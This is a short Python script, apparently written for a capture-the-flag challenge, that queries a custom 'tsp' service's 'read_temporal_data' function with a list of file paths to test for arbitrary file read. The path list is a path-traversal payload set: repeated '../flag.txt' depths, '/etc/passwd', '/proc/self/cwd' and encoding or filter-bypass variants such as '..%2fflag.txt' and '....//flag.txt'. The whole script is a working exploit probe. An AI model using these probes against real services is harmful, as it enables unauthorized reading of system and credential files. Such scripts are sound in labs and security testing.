import tsp, query, sys

S = tsp.enc_str

def read(path):
    params = [(S("dimension"), tsp.enc_call("read_temporal_data", [S(path)]))]
    h, b = query.send_raw(query.build_query(params, flags=0x2a))
    try:
        val, _ = tsp.decode(b, 12)
        return val["data"]["dimension"]
    except Exception as e:
        return "ERR:" + repr(b[:80])

paths = sys.argv[1:] or [
    "flag", "flag.txt", "flag.tsp", "flag.dat", "temporal.dat", "data.tsp",
    ".", "/", "..", "../", "data", "data/", "/etc/passwd", "../flag.txt",
    "../../flag.txt", "../../../flag.txt", "../../../../flag.txt",
    "/flag.txt", "/flag", "../flag", "../../etc/passwd",
    "....//flag.txt", "..%2fflag.txt", "/proc/self/cwd",
]
for p in paths:
    print(repr(p), "->", read(p))
